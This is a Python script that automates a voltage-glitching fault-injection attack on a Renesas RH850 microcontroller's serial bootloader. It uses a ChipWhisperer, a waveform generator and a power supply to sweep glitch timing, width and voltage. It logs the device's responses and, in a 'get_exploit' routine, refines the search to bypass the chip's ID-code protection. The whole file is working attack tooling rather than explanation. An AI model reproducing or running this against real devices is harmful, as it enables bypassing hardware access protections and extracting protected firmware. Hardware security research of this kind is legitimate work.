#!/usr/bin/env python3

import sys
import time

import numpy as np
import chipwhisperer as cw

from rh850 import make_pkt, as_hex, read_block
from awg import Awg
from psu import Psu
from database import Database, query

class GlitchException(Exception):
    pass

class ConnectException(GlitchException):
    pass

class SuccessException(GlitchException):
    pass

class SilentException(GlitchException):
    pass

class ExpectedResponse(GlitchException):
    pass

class UnexpectedResponse(GlitchException):
    pass


def attempt(scope, target):
    target.read(target.in_waiting()) # Clean all bytes in serial input buffer

    target.write(b'\x00' * 10)
    if target.read(1) != '\x00':
        raise ConnectException("Connect error 1")

    # Connect
    target.write(b'\x55')
    if target.read(1) != '\xc1':
        raise ConnectException("Connect error 2")

    # Get device type
    target.write(b'\x01\x00\x01\x38\xc7\x03')
    assert target.read(6) == '\x81\x00\x01\x38\xc7\x03', "Wrong Resp Device Type 1"

    target.write(b'\x81\x00\x01\x38\xc7\x03')
    resp = target.read(30)
    assert resp == '\x81\x00\x19\x38\x10\x00\xff\x40\x00\x48\x01\x00\x01\x6e\x36\x00\x00\x7a\x12\x00\x05\xb8\xd8\x00\x01\x7d\x78\x40\x1b\x03', "Wrong Resp Device Type 2"

    # Set up frequencies
    target.write(make_pkt(b'\x32\x00\xf4\x24\x00\x01\x7d\x78\x40'))

    resp = target.read(6)
    assert resp == '\x81\x00\x01\x32\xcd\x03', "wrong resp freq 1"

    target.write(b'\x81\x00\x01\x32\xcd\x03')
    resp = target.read(14)
    assert resp == '\x81\x00\x09\x32\x01\x7d\x78\x40\x00\xbe\xbc\x20\xf5\x03', "unexpected resp freq 2"

    # Set bitrate (9600 baud)
    target.write(b'\x01\x00\x05\x34\x00\x00\x25\x80\x22\x03')
    resp = target.read(6)
    assert resp == '\x81\x00\x01\x34\xcb\x03', "wrong resp bitrate 1"

    # Synchronize!
    target.write(b'\x01\x00\x01\x00\xff\x03')
    resp = target.read(6)
    assert resp == '\x81\x00\x01\x00\xff\x03', "wrong resp synchronize"

    target.write(make_pkt(b'\x30' + (b'\xff' * 16)))
    resp = target.read(7)
    # print(as_hex(resp))

    if resp == '\x81\x00\x02\x30\x00\xce\x03':
        print("OKKK!")
        raise SuccessException(as_hex(resp))
    elif resp == '\x81\x00\x02\xb0\xdb\x73\x03': # Wrong ID
        raise ExpectedResponse(as_hex(resp))
    elif resp == '' or resp == '\x00':
        raise SilentException(as_hex(resp))
    else:
        raise UnexpectedResponse(as_hex(resp))

    raise NotImplementedError

def get_search_course():
    for voltage in np.arange(0.9, 0.8, -0.01):
        for trigger_delay in np.arange(30e-6, 80e-6, 1000e-9):
                for width in np.concatenate((np.arange(10e-9, 100e-9, 10e-9), np.arange(100e-9, 2000e-9, 100e-9), np.arange(2000e-9, 15_000e-9, 500e-9))):
                    yield (trigger_delay, voltage, width)

def get_search_fine():
    for voltage in np.arange(0.9, 0.8, -0.01):
        for trigger_delay in np.arange(5e-6, 10e-6, 100e-9):
                for width in np.concatenate((np.arange(10e-9, 100e-9, 10e-9), np.arange(100e-9, 2000e-9, 100e-9), np.arange(2000e-9, 15_000e-9, 500e-9))):
                    yield (trigger_delay, voltage, width)

def get_exploit(fn):
    results = query(fn, "SELECT * FROM experiments WHERE color = 'O' ORDER BY voltage DESC")

    for row in results:
        delay = row['delay'] / 1e9
        voltage = row['voltage']
        length = row['length'] / 1e9

        for d in np.arange(max(0, delay - 0.5e-6), delay + 0.5e-6, 100e-9):
            for l in np.arange(max(0, length - 0.5e-6), length + 0.5e-6, 100e-9):
                yield (d, voltage, l)

if __name__ == "__main__":

    db = Database(sys.argv, extra_params=['delay', 'length', 'voltage'])

    awg = Awg()
    print(awg.ident())

    psu = Psu()
    psu.enable_output(1, True)
    psu.enable_output(2, True)

    awg.init_for_glitching()

    awg.period(1, 1e-6)
    awg.glitch_voltage(1, 1.25, 1.25)
    awg.output_state(1, True)

    scope = cw.scope()

    scope.default_setup()
    scope.io.tio1 = 'serial_tx'
    scope.io.tio2 = 'serial_rx'
    scope.io.tio3 = 'gpio_low'
    scope.io.glitch_trig_mcx = 'glitch'

    scope.clock.clkgen_src = 'system'
    scope.clock.clkgen_freq = 10e6
    scope.clock.adc_mul = 1

    target = cw.target(scope)
    target.baud = 9600
    target.flush()

    scope.trigger.triggers = 'tio1'
    scope.trigger.module = 'UART'
    scope.gain.db = 12

    scope.UARTTrigger.enabled = True
    scope.UARTTrigger.baud = 9600
    # scope.UARTTrigger.set_pattern_match(0, '\x22\x03\x01\x00\x01\x00\xff\x03') # Synchronize
    scope.UARTTrigger.set_pattern_match(0, '\xff\xff\xff\xff\xff\xff\xcf\x03') # ID Code
    scope.UARTTrigger.trigger_source = 0
    scope.UARTTrigger.rules_enabled = [0]

    scope.io.glitch_trig_mcx = 'trigger'

    while True:
        # for trigger_delay, voltage, width in get_search():
        for trigger_delay, voltage, width in get_search_course():
        # for trigger_delay, voltage, width in get_exploit(sys.argv[1]):

            # Acount for trigger delay
            delay = max(0, trigger_delay - 1.25e-6)
            awg.trigger_delay(1, delay)
            awg.glitch_voltage(1, 1.25, voltage)
            awg.period(1, width)

            print(f"Attempt, delay {trigger_delay * 1e6:.2f} us, width {width * 1e6:.3f} us, voltage {voltage:.2f}")

            scope.sc.arm(False)
            scope.arm()

            try:
                scope.io.tio3 = 'gpio_low' # Assert reset
                time.sleep(.2)
                scope.io.tio3 = 'gpio_high' # Release Reset
                time.sleep(.2)

                attempt(scope, target)

                print("Should not get here")
            except ExpectedResponse as e:
                print("Normal")
                db.insert(0, color='G', response=str(e).encode(), delay=int(trigger_delay * 1e9), length=int(width * 1e9), voltage=voltage)

            except SuccessException as e:
                db.insert(0, color='R', response=str(e).encode(), delay=int(trigger_delay * 1e9), length=int(width * 1e9), voltage=voltage)

            except ConnectException as e:
                time.sleep(1)
                print("Power cycle", e)
                # db.insert(0, color='Y', response=b'', delay=int(trigger_delay * 1e9), length=int(width * 1e9), voltage=voltage)

                psu.enable_output(1, False)
                psu.enable_output(2, False)
                time.sleep(2)
                psu.enable_output(2, True)
                psu.enable_output(1, True)
                time.sleep(2)
            except UnexpectedResponse as e:
                db.insert(0, color='O', response=str(e).encode(), delay=int(trigger_delay * 1e9), length=int(width * 1e9), voltage=voltage)

            except Exception as e:
                db.insert(0, color='Y', response=str(e).encode(), delay=int(trigger_delay * 1e9), length=int(width * 1e9), voltage=voltage)

            finally:
                scope.io.tio3 = 'gpio_low' # Assert reset
